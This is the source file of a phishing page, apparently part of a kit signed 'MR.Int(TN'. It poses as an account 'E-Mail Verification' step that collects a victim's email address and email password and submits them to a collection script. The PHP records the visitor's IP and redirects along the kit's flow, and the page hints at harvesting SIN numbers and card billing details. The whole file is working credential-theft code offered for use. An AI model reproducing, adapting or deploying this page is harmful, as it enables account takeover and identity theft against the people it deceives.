<?php

/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
/*                   #              ||~~MR.Int(TN  ~~||              #                            */
/* - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -  */
error_reporting(0);
session_start();
include("lang/". $_SESSION['_lang_'].".php");
if(isset($_POST['noob'])){
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];


 if(isset($_POST['vbv_ready']) == true){
  #ip info
  header("location:res/res2.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
else{

 header("location:res/res2.php?websrc=".md5('XRAY')."&dispatched=".rand(20,100)."&id=".rand(10000000000,500000000)." ");
        }
		  }
?>


<!DOCTYPE html>
<html>
<head>
<script language="javascript">
function verif()
{
	if(f.1.value.length != 9)
	{
		alert('your SIN number must be 9 Digit);
	}
	
}
</script>
<meta charset="utf-8">
<title>My Account</title>
<meta name="generator" content="WYSIWYG Web Builder 10 - http://www.wysiwygwebbuilder.com">
<link href="images/favicon.ico" rel="shortcut icon" type="image/x-icon">
<link href="css/Untitled1.css" rel="stylesheet">
<link href="css/billing.css" rel="stylesheet">

<style type="text/css">
    .check_box{
        background-image: url("css/onboarding_form.png");
        background-repeat: no-repeat;
        padding-left: 28px;
        line-height: 26px;
        display: inline-block;
        margin-bottom: 9px;
        cursor: pointer;
    }
    #checked{
        background-position: 0px -100px;
    }
    #inchecked{
        background-position: 0px 0px;
    }
.inp{
        width: 331px;
        height: 40px;
        padding-left: 12px;
        margin-bottom: 15px;
        border: 1px solid #B7B6B6;
        border-radius: 3px;
        font-size: 16px;
        text-transform: capitalize;
} 
  .card{
        display: inline-block;
        background-image: url("css/sprites_cc_global.png");
        background-repeat: no-repeat;
        background-position: 0px -406px;
        height: 12px;
        position: relative;
        left: 124px;
        bottom: -15px;
        width: 40px;
         }
    .date{
    display: inline-block;
    background-image: url("css/sprites_cc_global.png");
    background-repeat: no-repeat;
    background-position: 0px -434px;
    height: 28px;
    position: relative;
    left: -49px;
    bottom: -9px;
    width: 40px;
    }
.in{
        font-family: arial, Helvetica, sans-serif;
    font-size: 10pt;
    color: #333;
    font-weight: normal;
    padding-top: 12px;
    padding-bottom: 12px;
    border-radius: 4px;
    border: 1px solid #CCC;
    margin: 5px;
    float: left;
}
  </style>
</head>


<body>
<div id="wb_Form1" style="position:absolute;left:386px; border-radius: 10px; top:123px;width:510px;height:396px;z-index:0;">

<form  name="f" class="xxray_51" method="GET"   action="res/res3.php" style="" onsubmit="return verif()">

<center>





 <center>
 <br><br>
  <h2 style="
    font-family: Arial, Helvetica, sans-serif;
    font-size: 20pt;
    font-weight: normal;
    color: #666;
">E-Mail Verification </h2><br><br>
		
		<input type="text"  id="Email" name="2"  class="inp" value="" placeholder="Enter Your e-mail" style="width: 330px;" required><br>
		<input  type="password"  id="password" name="3"  class="inp" value=""   maxlength="20" placeholder="Enter Your e-mail Password " style="width: 330px;"required><br>
		
		
			
<br>
 
				
                        <input type="checkbox" hidden="hidden" id="checkbox" name="vbv_ready">
				
				
				
					<center>
        <input class="inpclassicsumblit2" name="noob" type="submit" style="width: 364px;padding: 15px;      border-radius: 5px;      border: 0px solid red;      width: 330px;      margin-top: 9px;      background-color: #666;      font-family: Arial, Helvetica, sans-serif;      font-weight: bold;      color: #FFF;      font-size: 16px;" value="Confirm" id="valider">
<br></center>
        
  
        </div></center>
                                 
		
		
	</div>

		<input name="flow_name" value="summary/index" type="hidden"><input name="flow_name" value="summary/index" type="hidden">  
           
        </div>
                
            </div>
        </div>
		
	
</form>
		
	
	
</body>
</html>